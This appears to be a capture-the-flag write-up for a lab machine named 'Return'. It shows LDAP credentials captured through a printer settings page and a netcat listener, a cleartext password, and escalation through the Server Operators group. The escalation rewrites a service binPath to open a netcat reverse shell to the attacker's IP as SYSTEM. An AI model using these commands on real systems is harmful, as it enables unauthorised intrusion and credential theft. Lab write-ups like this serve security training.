#box #password-spoofing #server-operators #sc #services

## 80 - HTTP

On port 80 we discover the presence of a website that recalls a printer service. On the `Settings` page we discover some settings concerning the given machine. The Server Address provides us a hint for the DNS of the machine `printer.return.local` which we promptly add to `/etc/hosts`.
Moreover, when we click on Update an API is triggered, accepting a `ip` parameter in the POST payload:

![[attachments/return-writeup-2.png]]

We start up a netcat session with `nc -lvnp 389` (must be port 389 which is the same port indicated on the settings page) and we try to banner grab that by changing this address to our one:

![[attachments/return-writeup-1.png]]

and we end up receiving a password, which shall be the password of the user `svc-printer` shown also on the settings page:

![[attachments/return-writeup-3.png]]

We then opt to try authenticate with those credentials: `svc-printer:1edFg43012!!` with SMB succeeding. We have the same success within `evil-winrm` obtaining a foothold on the target machine and its user flag.

## Privilege Escalation

Once on the target machine, we realize that our user `svc-printer` belongs to the group `Server Operators`:

```bash
whoami /all # or whoami /groups
```

![[attachments/return-writeup-4.png]]

Considering the type of group we belong to, we can leverage the following [technique](https://www.hackingarticles.in/windows-privilege-escalation-server-operator-group/) to escalate to NT AUTHORITY\SYSTEM. So we first upload netcat on the machine and then we:

```bash
sc.exe config VMTools binPath="C:\Temp\nc.exe -e cmd.exe 10.10.16.3 4444"
```

Once assigned this binPath to VMTools, we must restart the service:

```bash
sc.exe stop VMTools
sc.exe start VMTools
```

This will return us a shell on our listener port as NT AUTHORITY\SYSTEM
